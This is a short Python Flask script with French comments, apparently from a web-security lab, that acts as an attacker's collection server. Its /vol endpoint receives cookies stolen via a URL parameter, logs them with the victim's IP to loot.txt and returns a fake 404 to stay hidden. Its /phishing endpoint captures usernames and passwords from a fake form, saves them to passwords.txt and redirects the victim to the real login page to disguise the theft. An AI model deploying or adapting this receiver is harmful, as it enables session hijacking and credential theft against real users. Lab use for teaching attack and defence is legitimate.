# Fichier : hacker_server.py
# Ce script simule le serveur du pirate qui écoute sur le port 8000
from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__)


@app.route('/vol', methods=['GET'])
def vol_cookie():
    # 1. Récupère le cookie envoyé dans l'URL
    cookie = request.args.get('cookie')
    ip = request.remote_addr

    if cookie:
        print(f"boite_[+] COOKIE VOLÉ : {cookie}")

        # 2. Enregistre dans un fichier texte 'loot.txt'
        with open("loot.txt", "a") as f:
            f.write(f"[{datetime.now()}] IP: {ip} | COOKIE: {cookie}\n")

    return "Image not found", 404  # Pour rester discret

@app.route('/phishing', methods=['POST'])
def phishing():
    # 1. On récupère les données du faux formulaire
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.remote_addr

    # 2. On affiche dans la console
    print(f"💀 [PHISHING] Identifiants volés !")
    print(f"    👤 User: {username}")
    print(f"    🔑 Pass: {password}")

    # 3. On sauvegarde dans un fichier
    with open("passwords.txt", "a") as f:
        f.write(f"[{datetime.now()}] IP: {ip} | User: {username} | Pass: {password}\n")

    # 4. On redirige la victime vers la vraie page de connexion pour faire "genre c'était un bug"
    return redirect("http://localhost:5000/login")

if __name__ == '__main__':
    print("💀 Serveur Pirate en écoute sur le port 8000...")
    app.run(port=8000,host="0.0.0.0", debug=True)